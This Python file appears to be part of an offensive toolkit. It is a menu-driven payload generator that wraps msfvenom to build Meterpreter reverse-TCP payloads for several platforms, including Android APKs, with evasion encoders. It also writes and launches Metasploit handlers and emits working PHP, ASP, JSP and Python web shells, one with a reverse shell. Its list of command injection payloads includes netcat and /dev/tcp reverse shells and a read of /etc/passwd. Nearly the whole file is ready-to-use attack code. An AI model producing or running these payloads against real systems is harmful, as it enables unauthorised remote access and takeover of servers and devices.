#!/usr/bin/env python3
# app/exploitation/payload_generator.py - Advanced Payload Generator

import sys
import os
import subprocess
import time
import base64
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, BASE_DIR)

from config import C_OK, C_WARN, C_ERR, C_RESET, C_INFO, C_TITLE, REPORTS_DIR
from utils import Logger, pause, clear_screen, InputValidator, CommandRunner, ReportWriter

class PayloadGenerator:
    def __init__(self):
        self.reports_dir = os.path.join(REPORTS_DIR, 'exploitation', 'payloads')
        os.makedirs(self.reports_dir, exist_ok=True)
        self.output_dir = os.path.join(self.reports_dir, 'generated')
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Payload ma'lumotlarini saqlash
        self.last_payload_info = {}
    
    def run(self):
        """Main payload generator menu"""
        while True:
            clear_screen()
            print(f"\n{C_TITLE}╔══════════════════════════════════════════╗")
            print(f"║        PAYLOAD GENERATOR                 ║")
            print(f"╚══════════════════════════════════════════╝{C_RESET}\n")
            
            print(f"{C_INFO}  [1]  Msfvenom Payloads{C_RESET}")
            print(f"{C_INFO}  [2]  Web Payloads{C_RESET}")
            print(f"{C_INFO}  [3]  Encoded Payloads{C_RESET}")
            print(f"{C_INFO}  [4]  Custom Shellcode{C_RESET}")
            print(f"{C_INFO}  [5]  Backdoor Generator{C_RESET}")
            print(f"\n{C_WARN}  [0]  Back{C_RESET}\n")
            
            choice = InputValidator.get_choice()
            
            if choice == '0':
                return
            elif choice == '1':
                self.msfvenom_payloads()
            elif choice == '2':
                self.web_payloads()
            elif choice == '3':
                self.encoded_payloads()
            elif choice == '4':
                self.custom_shellcode()
            elif choice == '5':
                self.backdoor_generator()
            else:
                Logger.error("Invalid choice!")
                time.sleep(1)
    
    def msfvenom_payloads(self):
        """Generate Msfvenom payloads"""
        clear_screen()
        print(f"\n{C_TITLE}═══ MSFVENOM PAYLOAD GENERATOR ═══{C_RESET}\n")
        
        if not CommandRunner.check_tool('msfvenom'):
            Logger.error("Msfvenom not installed!")
            Logger.info("Install: sudo apt install metasploit-framework")
            pause()
            return
        
        print(f"{C_INFO}Payload Types:{C_RESET}")
        print(f"  [1] Windows Reverse TCP (exe)")
        print(f"  [2] Linux Reverse TCP (elf)")
        print(f"  [3] Android APK")
        print(f"  [4] PHP Web Shell")
        print(f"  [5] Python Reverse Shell")
        print(f"  [6] Java WAR")
        print(f"  [7] ASP/ASPX")
        print(f"  [8] Custom\n")
        
        choice = input(f"{C_INFO}Select payload [1-8]: {C_RESET}").strip()
        
        payloads = {
            '1': ('windows/meterpreter/reverse_tcp', 'exe'),
            '2': ('linux/x86/meterpreter/reverse_tcp', 'elf'),
            '3': ('android/meterpreter/reverse_tcp', 'apk'),
            '4': ('php/meterpreter/reverse_tcp', 'php'),
            '5': ('python/meterpreter/reverse_tcp', 'py'),
            '6': ('java/jsp_shell_reverse_tcp', 'war'),
            '7': ('windows/meterpreter/reverse_tcp', 'aspx'),
        }
        
        if choice == '8':
            payload = input(f"{C_INFO}Enter payload name: {C_RESET}").strip()
            format_type = input(f"{C_INFO}Enter format: {C_RESET}").strip()
        elif choice in payloads:
            payload, format_type = payloads[choice]
        else:
            Logger.error("Invalid choice!")
            pause()
            return
        
        print()
        lhost = input(f"{C_INFO}Enter LHOST (your IP): {C_RESET}").strip()
        lport = input(f"{C_INFO}Enter LPORT [4444]: {C_RESET}").strip() or "4444"
        
        if not lhost:
            Logger.error("LHOST required!")
            pause()
            return
        
        # Output filename
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = os.path.join(self.output_dir, f"payload_{timestamp}.{format_type}")
        
        # Encoding options
        print(f"\n{C_INFO}Encoding Options:{C_RESET}")
        print(f"  [1] No encoding")
        print(f"  [2] x86/shikata_ga_nai")
        print(f"  [3] x86/call4_dword_xor")
        print(f"  [4] cmd/powershell_base64\n")
        
        enc_choice = input(f"{C_INFO}Select encoding [1-4]: {C_RESET}").strip()
        
        encoders = {
            '2': 'x86/shikata_ga_nai',
            '3': 'x86/call4_dword_xor',
            '4': 'cmd/powershell_base64',
        }
        
        encoder = encoders.get(enc_choice, '')
        iterations = '5' if encoder else '1'
        
        if encoder:
            iterations = input(f"{C_INFO}Encoding iterations [5]: {C_RESET}").strip() or '5'
        
        Logger.info(f"Generating payload...")
        Logger.info(f"Payload: {payload}")
        Logger.info(f"LHOST: {lhost}")
        Logger.info(f"LPORT: {lport}")
        Logger.info(f"Format: {format_type}")
        if encoder:
            Logger.info(f"Encoder: {encoder} (x{iterations})")
        
        # Build command - APK uchun maxsus format
        if format_type == 'apk':
            # APK uchun R > redirect format
            cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport}"
            
            if encoder:
                cmd += f" -e {encoder} -i {iterations}"
            
            cmd += f" R > {output_file}"
        else:
            cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format_type}"
            
            if encoder:
                cmd += f" -e {encoder} -i {iterations}"
            
            cmd += f" -o {output_file}"
        
        print(f"\n{C_INFO}Command:{C_RESET}")
        print(f"{cmd}\n")
        
        pause("Press Enter to generate...")
        
        # Run command
        returncode, stdout, stderr = CommandRunner.run(cmd, shell=True)
        
        if returncode == 0:
            Logger.success(f"Payload generated successfully!")
            Logger.info(f"Location: {output_file}")
            
            if os.path.exists(output_file):
                size = os.path.getsize(output_file)
                Logger.info(f"Size: {size} bytes")
                
                # Save report
                report_content = ReportWriter.create_report_header("Msfvenom Payload", payload)
                report_content += f"Command: {cmd}\n"
                report_content += f"LHOST: {lhost}\n"
                report_content += f"LPORT: {lport}\n"
                report_content += f"Format: {format_type}\n"
                if encoder:
                    report_content += f"Encoder: {encoder}\n"
                    report_content += f"Iterations: {iterations}\n"
                report_content += f"Output: {output_file}\n"
                report_content += f"Size: {size} bytes\n"
                
                report_file = os.path.join(self.reports_dir, f"payload_report_{timestamp}.txt")
                with open(report_file, 'w') as f:
                    f.write(report_content)
                
                Logger.info(f"Report: {report_file}")
                
                # Payload ma'lumotlarini saqlash
                self.last_payload_info = {
                    'payload': payload,
                    'lhost': lhost,
                    'lport': lport,
                    'format': format_type,
                    'file': output_file
                }
                
                # Multi/handler taklifi
                print(f"\n{C_TITLE}{'═' * 50}{C_RESET}")
                setup_handler = input(f"\n{C_INFO}Setup Metasploit multi/handler for this payload? [Y/n]: {C_RESET}").strip().lower()
                
                if setup_handler != 'n':
                    self.setup_multihandler(payload, lhost, lport)
        else:
            Logger.error("Payload generation failed!")
            if stderr:
                print(f"{C_ERR}{stderr}{C_RESET}")
        
        pause()
    
    def setup_multihandler(self, payload, lhost, lport):
        """Setup and start Metasploit multi/handler"""
        clear_screen()
        print(f"\n{C_TITLE}═══ METASPLOIT MULTI/HANDLER SETUP ═══{C_RESET}\n")
        
        # Check if msfconsole exists
        if not CommandRunner.check_tool('msfconsole'):
            Logger.error("Metasploit not installed!")
            Logger.info("Install: sudo apt install metasploit-framework")
            pause()
            return
        
        # Port tekshirish
        if not self._check_port_available(lhost, int(lport)):
            Logger.warning(f"Port {lport} is already in use!")
            new_port = input(f"{C_INFO}Enter new LPORT or press Enter to cancel: {C_RESET}").strip()
            if new_port:
                lport = new_port
                Logger.info(f"Using new port: {lport}")
            else:
                Logger.info("Handler setup cancelled")
                pause()
                return
        
        Logger.info(f"Setting up handler for: {payload}")
        Logger.info(f"LHOST: {lhost}")
        Logger.info(f"LPORT: {lport}")
        
        # RC fayl yaratish
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        rc_file = os.path.join(self.output_dir, f"handler_{timestamp}.rc")
        
        # Interactive yoki background'ga qarab RC file yaratish
        rc_content = f"""use exploit/multi/handler
set payload {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
"""
        
        with open(rc_file, 'w') as f:
            f.write(rc_content)
        
        Logger.success(f"Handler RC file created: {rc_file}")
        
        print(f"\n{C_INFO}Handler Configuration:{C_RESET}")
        print(f"{C_OK}Module:  {C_RESET}exploit/multi/handler")
        print(f"{C_OK}Payload: {C_RESET}{payload}")
        print(f"{C_OK}LHOST:   {C_RESET}{lhost}")
        print(f"{C_OK}LPORT:   {C_RESET}{lport}")
        
        print(f"\n{C_INFO}Options:{C_RESET}")
        print(f"  [1] Start handler now (interactive)")
        print(f"  [2] Start handler in background")
        print(f"  [3] Show RC file content")
        print(f"  [4] Show manual commands")
        print(f"  [0] Skip\n")
        
        choice = input(f"{C_INFO}Select option: {C_RESET}").strip()
        
        if choice == '1':
            # Interactive mode - foreground exploit
            with open(rc_file, 'a') as f:
                f.write("exploit\n")  # -j flag'siz, foreground mode
            
            clear_screen()
            print(f"\n{C_TITLE}═══ METASPLOIT HANDLER STARTING ═══{C_RESET}\n")
            Logger.success("Handler will start in interactive mode!")
            Logger.info(f"Listening on {lhost}:{lport}")
            print(f"\n{C_OK}{'═' * 50}{C_RESET}")
            print(f"{C_INFO}INSTRUCTIONS:{C_RESET}")
            print(f"{C_OK}{'═' * 50}{C_RESET}")
            print(f"\n{C_INFO}• Handler will start listening automatically{C_RESET}")
            print(f"{C_INFO}• You will see connection attempts in real-time{C_RESET}")
            print(f"{C_INFO}• When a device connects, session will open automatically{C_RESET}")
            print(f"{C_WARN}• Use 'Ctrl+Z' to background the session{C_RESET}")
            print(f"{C_WARN}• Use 'Ctrl+C' then 'exit' to quit msfconsole{C_RESET}")
            print(f"\n{C_OK}{'═' * 50}{C_RESET}\n")
            time.sleep(3)
            
            cmd = f"msfconsole -q -r {rc_file}"
            os.system(cmd)
            
        elif choice == '2':
            # Background mode - exploit -j -z qo'shish  
            with open(rc_file, 'a') as f:
                f.write("exploit -j -z\n")
            
            Logger.info("Starting Metasploit handler in background...")
            print(f"{C_INFO}Waiting for connections on {lhost}:{lport}...{C_RESET}")
            
            # Create a wrapper script to keep msfconsole running
            wrapper_script = os.path.join(self.output_dir, f"handler_wrapper_{timestamp}.sh")
            with open(wrapper_script, 'w') as f:
                f.write(f"""#!/bin/bash
msfconsole -q -r {rc_file} -x "sleep infinity" > /dev/null 2>&1 &
echo $! > {self.output_dir}/handler_{timestamp}.pid
""")
            os.chmod(wrapper_script, 0o755)
            
            subprocess.Popen([wrapper_script], shell=True)
            time.sleep(2)
            
            # PID faylni o'qish
            pid_file = os.path.join(self.output_dir, f"handler_{timestamp}.pid")
            if os.path.exists(pid_file):
                with open(pid_file, 'r') as f:
                    pid = f.read().strip()
                Logger.success(f"Handler started in background! PID: {pid}")
                Logger.info(f"PID file: {pid_file}")
                Logger.info(f"To stop: kill {pid}")
            else:
                Logger.success("Handler started in background!")
                Logger.info("Use 'ps aux | grep msfconsole' to check status")
            
            Logger.info("Connect to handler: msfconsole -q -x 'sessions'")
            time.sleep(2)
            
        elif choice == '3':
            # Show RC content
            print(f"\n{C_INFO}RC File Content:{C_RESET}")
            print(f"{C_OK}{rc_content}{C_RESET}")
            print(f"\n{C_INFO}File location: {rc_file}{C_RESET}")
            pause()
            
        elif choice == '4':
            # Show manual commands
            print(f"\n{C_INFO}═══ MANUAL SETUP COMMANDS ═══{C_RESET}\n")
            print(f"{C_OK}1. Start Metasploit:{C_RESET}")
            print(f"   msfconsole -q")
            print(f"\n{C_OK}2. Configure handler:{C_RESET}")
            print(f"   use exploit/multi/handler")
            print(f"   set payload {payload}")
            print(f"   set LHOST {lhost}")
            print(f"   set LPORT {lport}")
            print(f"   set ExitOnSession false")
            print(f"\n{C_OK}3. Start handler:{C_RESET}")
            print(f"   exploit -j")
            print(f"\n{C_WARN}   NOTE: Handler starts in background!{C_RESET}")
            print(f"{C_WARN}   DO NOT type 'run' or 'exploit' again!{C_RESET}")
            print(f"\n{C_OK}4. Check sessions:{C_RESET}")
            print(f"   sessions           (list all sessions)")
            print(f"   sessions -i 1      (interact with session 1)")
            print(f"   jobs               (list running handlers)")
            print(f"\n{C_OK}5. Useful commands:{C_RESET}")
            print(f"   background         (background current session)")
            print(f"   sessions -K        (kill all sessions)")
            print(f"   jobs -K            (kill all jobs)")
            print(f"\n{C_INFO}Or use RC file:{C_RESET}")
            print(f"   msfconsole -q -r {rc_file}")
            print(f"\n{C_INFO}RC file location:{C_RESET}")
            print(f"   {rc_file}")
            
            pause()
        
        elif choice == '0':
            Logger.info("Handler setup skipped")
            return
        else:
            Logger.error("Invalid choice!")
            pause()
    
    def web_payloads(self):
        """Generate web-specific payloads"""
        clear_screen()
        print(f"\n{C_TITLE}═══ WEB PAYLOAD GENERATOR ═══{C_RESET}\n")
        
        print(f"{C_INFO}Web Payload Types:{C_RESET}")
        print(f"  [1] PHP Web Shell")
        print(f"  [2] ASP Web Shell")
        print(f"  [3] JSP Web Shell")
        print(f"  [4] Python Web Shell")
        print(f"  [5] Command Injection Payload\n")
        
        choice = input(f"{C_INFO}Select payload [1-5]: {C_RESET}").strip()
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if choice == '1':
            self._generate_php_webshell(timestamp)
        elif choice == '2':
            self._generate_asp_webshell(timestamp)
        elif choice == '3':
            self._generate_jsp_webshell(timestamp)
        elif choice == '4':
            self._generate_python_webshell(timestamp)
        elif choice == '5':
            self._generate_cmd_injection(timestamp)
        else:
            Logger.error("Invalid choice!")
        
        pause()
    
    def _generate_php_webshell(self, timestamp):
        """Generate PHP web shell"""
        lhost = input(f"{C_INFO}Enter LHOST (optional): {C_RESET}").strip()
        lport = input(f"{C_INFO}Enter LPORT (optional): {C_RESET}").strip()
        
        php_shell = """<?php
// Simple PHP Web Shell
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<html>
<body>
<form method="GET">
    <input type="text" name="cmd" autofocus>
    <input type="submit" value="Execute">
</form>
</body>
</html>"""
        
        if lhost and lport:
            # Add reverse shell
            php_shell += f"""

<?php
// Reverse Shell
if(isset($_GET['rev'])) {{
    $sock = fsockopen("{lhost}", {lport});
    exec("/bin/sh -i <&3 >&3 2>&3");
}}
?>"""
        
        output_file = os.path.join(self.output_dir, f"webshell_{timestamp}.php")
        with open(output_file, 'w') as f:
            f.write(php_shell)
        
        Logger.success(f"PHP web shell generated: {output_file}")
        if lhost and lport:
            Logger.info(f"Reverse shell: {output_file}?rev=1")
    
    def _generate_asp_webshell(self, timestamp):
        """Generate ASP web shell"""
        asp_shell = """<%
Dim oScript
Dim oScriptNet
Dim oFileSys, oFile
Dim szCMD, szTempFile

On Error Resume Next

Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

szCMD = Request.Form("cmd")
If (szCMD <> "") Then
    szTempFile = "C:\\" & oFileSys.GetTempName()
    Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
    Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
End If
%>

<html>
<body>
<form method="POST">
<input type="text" name="cmd">
<input type="submit" value="Execute">
</form>
<pre>
<%
If (IsObject(oFile)) Then
    Response.Write(Server.HTMLEncode(oFile.ReadAll))
    oFile.Close
    Call oFileSys.DeleteFile(szTempFile, True)
End If
%>
</pre>
</body>
</html>"""
        
        output_file = os.path.join(self.output_dir, f"webshell_{timestamp}.asp")
        with open(output_file, 'w') as f:
            f.write(asp_shell)
        
        Logger.success(f"ASP web shell generated: {output_file}")
    
    def _generate_jsp_webshell(self, timestamp):
        """Generate JSP web shell"""
        jsp_shell = """<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>"""
        
        output_file = os.path.join(self.output_dir, f"webshell_{timestamp}.jsp")
        with open(output_file, 'w') as f:
            f.write(jsp_shell)
        
        Logger.success(f"JSP web shell generated: {output_file}")
    
    def _generate_python_webshell(self, timestamp):
        """Generate Python web shell"""
        python_shell = """#!/usr/bin/env python3
import os
from http.server import BaseHTTPRequestHandler, HTTPServer

class WebShell(BaseHTTPRequestHandler):
    def do_GET(self):
        cmd = self.path[1:]
        if cmd:
            output = os.popen(cmd).read()
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(output.encode())
        else:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'<html><body><h1>Web Shell</h1></body></html>')

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8000), WebShell)
    print('Starting web shell on port 8000...')
    server.serve_forever()
"""
        
        output_file = os.path.join(self.output_dir, f"webshell_{timestamp}.py")
        with open(output_file, 'w') as f:
            f.write(python_shell)
        
        os.chmod(output_file, 0o755)
        Logger.success(f"Python web shell generated: {output_file}")
        Logger.info("Usage: python3 webshell.py")
    
    def _generate_cmd_injection(self, timestamp):
        """Generate command injection payloads"""
        print(f"\n{C_INFO}Common Command Injection Payloads:{C_RESET}\n")
        
        payloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "`id`",
            "$(uname -a)",
            "; nc -e /bin/sh 10.0.0.1 4444",
            "| bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        ]
        
        content = ReportWriter.create_report_header("Command Injection Payloads", "Various Systems")
        
        for i, payload in enumerate(payloads, 1):
            print(f"{C_OK}[{i}] {payload}{C_RESET}")
            content += f"[{i}] {payload}\n"
        
        output_file = os.path.join(self.reports_dir, f"cmd_injection_{timestamp}.txt")
        with open(output_file, 'w') as f:
            f.write(content)
        
        Logger.success(f"Payloads saved: {output_file}")
    
    def encoded_payloads(self):
        """Generate encoded payloads"""
        clear_screen()
        print(f"\n{C_TITLE}═══ ENCODED PAYLOAD GENERATOR ═══{C_RESET}\n")
        
        print(f"{C_INFO}Encoding Types:{C_RESET}")
        print(f"  [1] Base64")
        print(f"  [2] URL Encoding")
        print(f"  [3] Hex Encoding")
        print(f"  [4] Unicode Encoding\n")
        
        choice = input(f"{C_INFO}Select encoding [1-4]: {C_RESET}").strip()
        payload = input(f"{C_INFO}Enter payload to encode: {C_RESET}").strip()
        
        if not payload:
            Logger.error("Payload required!")
            pause()
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if choice == '1':
            encoded = base64.b64encode(payload.encode()).decode()
            Logger.success(f"Base64: {encoded}")
        elif choice == '2':
            from urllib.parse import quote
            encoded = quote(payload)
            Logger.success(f"URL Encoded: {encoded}")
        elif choice == '3':
            encoded = payload.encode().hex()
            Logger.success(f"Hex: {encoded}")
        elif choice == '4':
            encoded = payload.encode('unicode_escape').decode()
            Logger.success(f"Unicode: {encoded}")
        else:
            Logger.error("Invalid choice!")
            pause()
            return
        
        # Save to file
        content = ReportWriter.create_report_header("Encoded Payload", "")
        content += f"Original: {payload}\n"
        content += f"Encoded: {encoded}\n"
        
        output_file = os.path.join(self.reports_dir, f"encoded_{timestamp}.txt")
        with open(output_file, 'w') as f:
            f.write(content)
        
        Logger.info(f"Saved: {output_file}")
        pause()
    
    def custom_shellcode(self):
        """Generate custom shellcode"""
        Logger.warning("Custom shellcode generator under development")
        pause()
    
    def backdoor_generator(self):
        """Generate backdoors"""
        Logger.warning("Backdoor generator under development")
        pause()
    
    def _check_port_available(self, host, port):
        """Check if port is available"""
        import socket
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            
            # Try to bind to check if port is free
            try:
                sock.bind(('0.0.0.0', port))
                sock.close()
                return True  # Port is available
            except OSError:
                sock.close()
                return False  # Port is in use
                
        except Exception as e:
            Logger.warning(f"Port check error: {e}")
            return True  # Assume available if check fails

if __name__ == "__main__":
    generator = PayloadGenerator()
    generator.run()